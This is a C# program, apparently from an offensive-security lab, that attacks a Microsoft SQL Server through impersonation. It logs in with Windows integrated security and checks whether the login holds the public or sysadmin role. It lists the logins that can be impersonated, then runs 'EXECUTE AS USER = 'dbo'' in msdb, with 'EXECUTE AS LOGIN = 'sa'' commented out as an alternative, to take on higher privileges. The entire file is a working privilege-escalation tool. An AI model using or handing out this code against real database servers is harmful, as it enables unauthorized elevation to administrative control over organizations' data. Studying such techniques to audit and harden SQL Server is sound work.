using System;
using System.Data.SqlClient;

namespace MSSQL_PE
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server \"" + sqlServer + "\" successfully!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication to MSSQL Server \"" + sqlServer + "\" failed!");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to user: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"public\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"public\" role!");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"sysadmin\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"sysadmin\" role!");
            }
            reader.Close();

            String queryLoginsAllowImpersonation = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(queryLoginsAllowImpersonation, con);
            reader = command.ExecuteReader();

            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: \"" + reader[0] + "\"");
            }
            reader.Close();

            Console.WriteLine("[*] Attempting Impersonation...");
            // String ExecuteAS = "EXECUTE AS LOGIN = 'sa';";
            String ExecuteAS = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(ExecuteAS, con);
            reader = command.ExecuteReader();
            reader.Close();

            // command = new SqlCommand(querylogin, con);   // String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(queryuser, con);   // String queryuser = "SELECT USER_NAME();";
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] After Impersonation: Now Executing in the Context of: \"" + reader[0] + "\"");
            reader.Close();

            con.Close();
        }
    }
}